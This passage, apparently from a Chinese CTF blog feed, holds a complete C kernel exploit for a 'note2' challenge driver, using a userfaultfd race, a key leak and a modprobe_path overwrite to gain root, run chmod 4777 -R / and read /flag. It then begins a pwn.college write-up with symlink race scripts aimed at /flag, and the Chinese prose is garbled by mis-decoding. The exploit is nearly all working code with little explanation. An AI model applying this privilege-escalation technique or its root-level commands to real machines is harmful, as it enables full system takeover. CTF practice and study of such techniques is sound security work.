class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;asm/ldt.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> uLL;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><br><span class="hljs-type">size_t</span> koffset = <span class="hljs-number">0</span>, kleak = <span class="hljs-number">0</span>, kbase = <span class="hljs-number">0xffffffff81000000</span>, kheap = <span class="hljs-number">0xffff888000000000</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>, pop_rdi_ret = <span class="hljs-literal">NULL</span>, init_cred = <span class="hljs-literal">NULL</span>, swapgs_restore_regs_and_return_to_usermode = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span> kfd = <span class="hljs-number">-1</span>, fault_cnt = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i += <span class="hljs-number">8</span>)<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016llx\e[0m\n&quot;</span>, i, *(uLL *)(buf + i));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">fatal</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1m[x] Error at: %s\e[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> idx;<br>    <span class="hljs-type">uint64_t</span> size;<br>    <span class="hljs-type">uint64_t</span> buf;<br>&#125; Note;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .size = size,<br>            .buf = buf,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF00</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .idx = idx,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF03</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .idx = idx,<br>            .buf = buf,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF01</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteShow</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    Note note =<br>        &#123;<br>            .idx = idx,<br>            .buf = buf,<br>        &#125;;<br>    ioctl(kfd, <span class="hljs-number">0xFFFFFF02</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">pthread_t</span> monitor_thread;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *buf;<br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span> *))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); <span class="hljs-comment">// Create UserFaultFd</span><br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        fatal(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        fatal(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>) <span class="hljs-comment">// Register UserFaultFd</span><br>        fatal(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-type">void</span> *)uffd); <span class="hljs-comment">// Run Handler</span><br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        fatal(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br>fault_handler_thread(<span class="hljs-type">void</span> *arg)<br>&#123;<br>    page_size = sysconf(_SC_PAGESIZE);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">long</span> uffd;<br>    uffd = (<span class="hljs-type">long</span>)arg;<br><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>    pollfd.fd = uffd;<br>    pollfd.events = POLLIN;<br><br><span class="hljs-keyword">while</span> (poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg)) &lt;= <span class="hljs-number">0</span>) fatal(<span class="hljs-string">&quot;read(uffd)&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd %02llx Start!\e[0m\n&quot;</span>, fault_cnt);<br>        <br>        <span class="hljs-keyword">switch</span> (fault_cnt)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * @brief kfree(0x18) (node-&gt;data)  !!Affected by UserFaultfd Now!!</span><br><span class="hljs-comment">             *        kfree(0x18) (struct node)</span><br><span class="hljs-comment">             */</span><br>            noteDel(<span class="hljs-number">0</span>);<br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 0 [*] Consume the 0x18 chunk (struct node)</span><br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 1 [*] Get the 0x18 chunk (node-&gt;data) as our new node struct so we can overwrite it</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-comment">/**</span><br><span class="hljs-comment">             * @brief kfree(0x18) (node-&gt;data)  !!Affected by UserFaultfd Now!!</span><br><span class="hljs-comment">             *        kfree(0x18) (struct node)</span><br><span class="hljs-comment">             */</span><br>            noteDel(<span class="hljs-number">2</span>);<br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 2 [*] Consume the 0x18 chunk (struct node)</span><br>            noteAdd(<span class="hljs-number">0x80</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 3 [*] Get the 0x18 chunk (node-&gt;data) as our new node struct so we can overwrite it</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            fatal(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)page; <span class="hljs-comment">// Addr to copy from</span><br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)msg.arg.pagefault.address &amp;<br>                          ~(page_size - <span class="hljs-number">1</span>); <span class="hljs-comment">// Addr to copy to</span><br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] uffdio_copy.src = 0x%016lx\e[0m\n&quot;</span>, uffdio_copy.src);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] uffdio_copy.dst = 0x%016lx\e[0m\n&quot;</span>, uffdio_copy.dst);<br><br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>) <span class="hljs-comment">// Back to copy_from_user</span><br>            fatal(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd %02llx Done!\e[0m\n&quot;</span>, fault_cnt);<br>        fault_cnt++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[*] Status saved.\e[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evilEdit</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[+] fault_page = 0x%016lx\e[0m\n&quot;</span>,buf + <span class="hljs-number">0x1000</span>*fault_cnt);<br>    noteEdit((<span class="hljs-type">int</span>)args, buf + <span class="hljs-number">0x1000</span>*fault_cnt);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1m[x] What happened? \e[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] Enjoy your shell...\e[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hijack_modprobe</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">// 0x752f706d742f</span><br>system(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\nsetsid cttyhack setuidgid 0 /bin/sh\nchmod 4777 -R /\n&#x27; &gt; /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/nightu&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/nightu&quot;</span>);<br>system(<span class="hljs-string">&quot;/tmp/nightu&quot;</span>);<br>system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> pwn_cpu;<br>    <span class="hljs-type">pthread_t</span> <span class="hljs-type">edit_t</span>, <span class="hljs-type">hijack_t</span>;<br>    <span class="hljs-type">size_t</span> rand_key, leak_addr;<br>    CPU_ZERO(&amp;pwn_cpu);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;pwn_cpu);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (sched_setaffinity(<span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">cpu_set_t</span>), &amp;pwn_cpu))<br>        fatal(<span class="hljs-string">&quot;sched_setaffinity&quot;</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[*] Wish you every shell...\e[0m\n&quot;</span>);<br>    saveStatus();<br><br>    kfd = open(<span class="hljs-string">&quot;/dev/note2&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (kfd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        fatal(<span class="hljs-string">&quot;\e[31m\e[1m[x] Fuck DEV \e[0m\n&quot;</span>);<br>    &#125;<br><br>    buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(buf, <span class="hljs-number">0x4000</span>, fault_handler_thread);<br><br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    <span class="hljs-type">size_t</span> *fake_node = (<span class="hljs-type">size_t</span> *)page;<br>    <span class="hljs-comment">// [*] Though we set key = 0, the addr&#x27;s data was encrypted before we change the key</span><br>    fake_node[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    fake_node[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>;<br>    fake_node[<span class="hljs-number">2</span>] = <span class="hljs-number">0xfffffe0000000000</span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief The first time, we try to hijack a node struct to AAR.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     */</span><br><br>    noteAdd(<span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 0</span><br>    pthread_create(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-type">void</span> *)<span class="hljs-number">0</span>);<br>    usleep(<span class="hljs-number">300000</span>);<br><br>    noteShow(<span class="hljs-number">1</span>, page);<br>    Hexdump(page, <span class="hljs-number">0x100</span>);<br>    rand_key = (*(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">0x8</span>)) ^ (<span class="hljs-number">0x00000000ffffffff</span>);<br>    *(<span class="hljs-type">size_t</span> *)(page) ^= rand_key;<br>    *(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">8</span>) ^= rand_key;<br>    *(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">0x10</span>) ^= rand_key;<br>    leak_addr = *(<span class="hljs-type">size_t</span> *)(page);<br>    kbase = (*(<span class="hljs-type">size_t</span> *)(page + <span class="hljs-number">0x4</span>)) - <span class="hljs-number">0xa08e00</span>;<br>    <span class="hljs-type">size_t</span> modprobe_path = kbase + <span class="hljs-number">0x1654b20</span>;<br>    Hexdump(page, <span class="hljs-number">0x30</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] rand_key = 0x%016lx\e[0m\n&quot;</span>, rand_key);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] leak_addr = 0x%016lx\e[0m\n&quot;</span>, leak_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] kbase = 0x%016lx\e[0m\n&quot;</span>, kbase);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] modprobe_path = 0x%016lx\e[0m\n&quot;</span>, modprobe_path);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * @brief The second time, we try to hijack a node struct to AAW.</span><br><span class="hljs-comment">     * </span><br><span class="hljs-comment">     */</span><br>    fake_node[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    fake_node[<span class="hljs-number">1</span>] = <span class="hljs-number">0x100</span>;<br>    fake_node[<span class="hljs-number">2</span>] = modprobe_path;<br>    noteAdd(<span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// id = 2</span><br>    pthread_create(&amp;<span class="hljs-type">hijack_t</span>, <span class="hljs-literal">NULL</span>, evilEdit, (<span class="hljs-type">void</span> *)<span class="hljs-number">2</span>);<br>    usleep(<span class="hljs-number">300000</span>);<br><br>    noteShow(<span class="hljs-number">3</span>, page);<br>    Hexdump(page, <span class="hljs-number">0x100</span>);<br>    rand_key = (*(<span class="hljs-type">size_t</span> *)(page)) ^ (<span class="hljs-number">0x6f6d2f6e6962732f</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] rand_key = 0x%016lx\e[0m\n&quot;</span>, rand_key);<br>    <span class="hljs-built_in">strcpy</span>(page,<span class="hljs-string">&quot;/tmp/u&quot;</span>);<br>    *(<span class="hljs-type">size_t</span> *)(page) ^= rand_key;<br>    *(<span class="hljs-type">size_t</span> *)(page+<span class="hljs-number">8</span>) ^= rand_key;<br>    noteEdit(<span class="hljs-number">3</span>, page);<br><br>    hijack_modprobe();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/202211301714001.png" alt="image-20221130171423180"></p><p>åé¢å†è¡¥.jpg</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn.college å­¦ä¹ è®°å½•</title>
    <link href="/posts/dc72b55e.html"/>
    <url>/posts/dc72b55e.html</url>
    
    <content type="html"><![CDATA[<h1>BabyRace</h1><h2 id="L1"><a class="header-anchor" href="#L1">Â¶</a>L1</h2><p><code>root</code> ä¸ä¼šå» follow <code>/tmp</code> ç›®å½•ä¸‹ä¸æ˜¯è‡ªå·±çš„é“¾æ¥æ–‡ä»¶ï¼Œæ‰€ä»¥è¦æ¢å…¶ä»–çš„ç›®å½•ã€‚æœ€ååœ¨æ£€æµ‹å®Œåæ”¹æ‰æˆ‘ä»¬è‡ªå·±çš„ fuck å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~<br><span class="hljs-built_in">ls</span> -s /flag ./fuck<br></code></pre></td></tr></table></figure><h2 id="L1-1"><a class="header-anchor" href="#L1-1">Â¶</a>L1.1</h2><p>åŠ é•¿ä¸€ä¸‹ç›®å½•åï¼Œå†™ä¸ª shell è„šæœ¬ï¼Œå¼€å¦å¤–ä¸€ä¸ªç»ˆç«¯ç–¯ç‹‚æ‘©æ“¦ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babyrace_level1:~$ <span class="hljs-built_in">cat</span> rep.sh <br><span class="hljs-comment">#!/bin/bash</span><br>int=1<br><span class="hljs-keyword">while</span>(( <span class="hljs-variable">$int</span>&lt;=5000000000000 ))<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">rm</span> /home/hacker/fuck<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;fuckyou&#x27;</span> &gt; /home/hacker/fuck<br>    <span class="hljs-built_in">rm</span> /home/hacker/fuck<br>    <span class="hljs-built_in">ln</span> -s /flag /home/hacker/fuck<br>    <span class="hljs-built_in">let</span> <span class="hljs-string">&quot;int++&quot;</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 